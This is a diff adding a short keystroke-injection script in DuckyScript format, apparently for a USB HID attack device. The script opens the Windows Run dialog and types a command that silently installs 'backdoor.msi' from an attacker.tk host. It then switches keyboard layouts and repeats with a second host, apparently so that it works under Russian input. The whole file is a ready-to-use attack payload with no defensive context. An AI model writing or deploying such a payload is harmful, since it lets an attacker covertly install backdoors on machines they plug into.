@@ -1,0 +1,15 @@
+GUI SPACE
+GUI r
+DELAY 300
+STRING msiexec /i https://en.attacker.tk/backdoor.msi /quiet
+DELAY 300
+ENTER
+SHIFT ALT
+DELAY 300
+SHIFT CTRL
+DELAY 300
+GUI r
+DELAY 300
+STRING msiexec /i https://ru.attacker.tk/backdoor.msi /quiet
+DELAY 300
+ENTER
